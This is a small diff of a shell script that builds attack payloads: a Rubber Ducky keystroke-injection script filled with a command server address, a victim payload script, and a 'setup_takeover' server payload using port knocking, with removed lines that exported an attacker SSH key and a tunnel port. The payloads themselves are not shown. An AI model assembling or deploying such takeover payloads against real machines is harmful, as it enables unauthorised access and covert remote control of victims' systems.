@@ -12,12 +12,8 @@ fi
 
 mkdir payload
 
-export ATTACKER_PUBLIC_KEY=$(cat ssh/ATTACKER.pub)
-export SERVER_PUBLIC_KEY=$(cat ssh/CENTRAL.pub)
-export SERVER_TUNNEL_PORT=9999
-export KNOCKD_CONF=$(cat setup_takeover/knockd.conf)
-export KNOCKD_CONF2=$(cat setup_takeover/knockd)
 
+envsubst "\$C_SERVER \$PAYLOAD_PATH" < ducky/ducky_script.txt > payload/ducky.txt
 envsubst < ducky/script.sh > payload/payload.sh
 envsubst < setup_takeover/setup_knock.bash > payload/server_payload.sh
 
